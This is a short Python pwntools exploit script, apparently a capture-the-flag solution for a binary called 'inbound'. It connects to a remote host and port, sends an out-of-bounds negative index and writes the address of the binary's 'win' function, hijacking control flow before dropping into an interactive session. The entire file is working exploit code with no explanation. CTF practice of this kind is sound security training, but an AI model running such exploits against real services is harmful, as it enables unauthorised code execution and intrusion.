#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./inbound',checksec=False)
p = remote('34.170.146.252', 51979)
#p = process()
#gdb.attach(p,gdbscript='''
#           b*0x000000000040129e
#            b*0x00000000004012ee

 #          ''')
input()

p.sendlineafter(b'index: ',b'-14')
p.sendlineafter(b'value: ',str(exe.sym.win))

p.interactive()
